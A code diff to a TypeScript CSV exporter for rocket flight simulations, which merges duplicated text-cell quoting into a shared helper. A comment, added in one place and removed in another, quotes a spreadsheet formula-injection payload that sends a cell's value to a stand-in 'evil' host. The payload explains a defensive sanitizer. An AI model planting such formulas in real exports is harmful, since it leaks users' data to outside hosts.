@@ -5,6 +5,7 @@ import {
   flightColumns,
   usableColumns,
   type FlightColumn,
+  type CsvFormat,
 } from '../flight/flightColumns';
 import { forwardFlightEnd, maxQ, maxQAlpha, maxRollRate, type EventRow } from '../flight/flightEvents';
 import { withLauncher, type LauncherKind } from '../design/launcher';
@@ -40,6 +41,18 @@ export type CsvTranslate = (key: string, vars?: Record<string, unknown>) => stri
 /** A translated column title with the unit its cells carry. */
 const titled = (title: string, unit?: string): string => csvField(unit ? `${title} (${unit})` : title);
 
+/**
+ * A text cell holding the user's own words or a translation: names come from
+ * the design, so they can hold a comma or a newline, and neither may split the
+ * row. Quoted rather than stripped, newlines flattened. Quoting alone does not
+ * stop spreadsheet formula injection: Excel and Sheets strip the quoting before
+ * evaluating, so a recovery device named `=HYPERLINK("http://evil/?"&A1,"Open")`
+ * in a shared .ork would execute when the CSV is opened. `csvQuoted` applies
+ * the shared rule, which neutralizes a trigger at the start and after an
+ * embedded separator.
+ */
+const textCell = (v: string): string => csvQuoted(v.replace(/[\r\n]+/g, ' '));
+
 /** A column's SI→display multiplier and the symbol its header should name. */
 const col = (units: UnitSelection, q: Quantity): { f: number; sym: string } => ({
   f: siToUiDelta(q, units[q], 1),
@@ -55,26 +68,9 @@ const col = (units: UnitSelection, q: Quantity): { f: number; sym: string } => (
  * significant digits with the event lines always on is one opinion about a file
  * somebody else has to read.
  */
-export interface FlightCsvOptions {
+export interface FlightCsvOptions extends Omit<CsvFormat, 'columns'> {
   /** Series keys to write, in `flightColumns` order. */
   columns: readonly string[];
-  /** Between fields. A tab or a space is as legitimate as a comma. */
-  separator: string;
-  /** Decimal places for every value. */
-  decimals: number;
-  /** 1.5e-4 rather than 0.00015, for series that span many magnitudes. */
-  exponential: boolean;
-  /** A comment naming the simulation and the design it flew. */
-  simDescription: boolean;
-  /**
-   * The column names with their units, as one commented line above the data:
-   * the file's only header, as on desktop.
-   */
-  fieldDescriptions: boolean;
-  /** A comment per flight event, placed among the data rows at its time. */
-  flightEvents: boolean;
-  /** What marks a comment line. */
-  commentChar: string;
   /** Which branch of a staged flight to write. */
   branchIndex: number;
   /**
@@ -283,18 +279,8 @@ export function flightEventsCsv(
   const vel = col(units, 'velocity');
   const ang = col(units, 'angle');
   const pres = col(units, 'pressure');
-  // Names come from the design and from a translation, so they can hold a comma
-  // or a newline; neither may split the row. Quoting rather than stripping,
-  // because unlike a column header these are the user's own words.
-  // Quoting alone does not stop spreadsheet formula injection: Excel and Sheets
-  // strip the quoting before evaluating, so a recovery device named
-  // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork would execute when
-  // the exported events CSV is opened. `csvQuoted` applies the shared rule,
-  // which neutralizes a trigger at the start and after an embedded separator.
-  const text = (v: string | undefined): string => {
-    if (v == null || v === '') return '';
-    return csvQuoted(v.replace(/[\r\n]+/g, ' '));
-  };
+  // An absent name is an empty cell rather than an empty quoted one.
+  const text = (v: string | undefined): string => (v ? textCell(v) : '');
 
   const lines: string[] = [];
   // The title line is a comment, not a quoted field, so a separator in the
@@ -376,9 +362,7 @@ export function runTableCsv(
   // q·α is Pa·rad in SI, written in the pressure unit times the angle unit.
   const ang = col(units, 'angle');
   const roll = col(units, 'rollRate');
-  // Every text cell is the user's own words or a translation: quoted, and
-  // neutralized by the shared rule, as the events export does.
-  const text = (v: string): string => csvQuoted(v.replace(/[\r\n]+/g, ' '));
+  const text = textCell;
   const lines = [
     row([
       titled(t('csv.head.simulation')),
